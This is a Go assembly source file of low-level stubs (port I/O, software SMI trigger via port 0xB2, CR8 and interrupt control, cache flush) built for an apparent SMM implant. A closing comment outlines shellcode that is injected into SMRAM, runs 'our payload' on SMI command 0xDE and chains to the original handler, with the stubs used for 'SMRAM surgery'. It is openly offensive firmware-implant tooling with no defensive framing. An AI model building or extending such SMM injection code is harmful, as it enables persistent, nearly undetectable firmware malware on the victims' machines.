// Copyright (C) 2026 Seif
// SMM-related assembly stubs.

#include "textflag.h"

// func outByte(port uint16, val byte)
// Write one byte to an I/O port (used to trigger software SMI via port 0xB2).
TEXT ·outByte(SB),NOSPLIT,$0-3
    MOVW    port+0(FP), DX
    MOVB    val+2(FP), AX
    OUTB                      // OUT DX, AL
    RET

// func inByte(port uint16) byte
TEXT ·inByte(SB),NOSPLIT,$0-9
    MOVW    port+0(FP), DX
    INB                       // IN AL, DX
    MOVB    AX, ret+8(FP)
    RET

// func outDword(port uint16, val uint32)
TEXT ·outDword(SB),NOSPLIT,$0-8
    MOVW    port+0(FP), DX
    MOVL    val+4(FP), AX
    OUTL                      // OUT DX, EAX
    RET

// func inDword(port uint16) uint32
TEXT ·inDword(SB),NOSPLIT,$0-12
    MOVW    port+0(FP), DX
    INL                       // IN EAX, DX
    MOVL    AX, ret+8(FP)
    RET

// func triggerSMI(apmc byte)
// Trigger a software SMI by writing to port 0xB2.
// The value is passed to the SMI handler in AL (SMI command byte).
TEXT ·triggerSMI(SB),NOSPLIT,$0-1
    MOVB    apmc+0(FP), AX
    MOVW    $0x00B2, DX
    OUTB                      // OUT 0xB2, AL — triggers SMI
    RET

// func readCR8() uintptr
// Read CR8 (Task Priority Register) — used to mask interrupts during SMRAM surgery.
TEXT ·readCR8(SB),NOSPLIT,$0-8
    MOVQ    CR8, AX
    MOVQ    AX, ret+0(FP)
    RET

// func writeCR8(val uintptr)
TEXT ·writeCR8(SB),NOSPLIT,$0-8
    MOVQ    val+0(FP), AX
    MOVQ    AX, CR8
    RET

// func cli()
// Disable interrupts — critical section around SMRAM open/write/close.
TEXT ·cli(SB),NOSPLIT,$0-0
    CLI
    RET

// func sti()
TEXT ·sti(SB),NOSPLIT,$0-0
    STI
    RET

// func wbinvdSMM()
// Write-back and invalidate all CPU caches. Required after writing to SMRAM
// so all CPUs see the new handler bytes before the next SMI fires.
TEXT ·wbinvdSMM(SB),NOSPLIT,$0-0
    BYTE $0x0F; BYTE $0x09   // WBINVD
    RET

// ─── Minimal SMI Handler Shellcode Template ───────────────────────────────
// This is the x64 SMM handler stub that gets injected into SMRAM.
// In practice SMM runs in 32-bit protected mode on most platforms, but
// modern UEFI SMM (PI SMM spec) supports 64-bit long mode.
//
// The handler:
//   1. Saves all GPRs.
//   2. Checks the SMI source (reads SMI_STS from PM I/O base).
//   3. If it is our software SMI (command = 0xDE), executes our payload.
//   4. Calls the original handler (chained).
//   5. Restores GPRs and executes RSM.
//
// The actual bytes are embedded as a Go byte slice in handler_windows.go.
// This comment documents the structure for review.
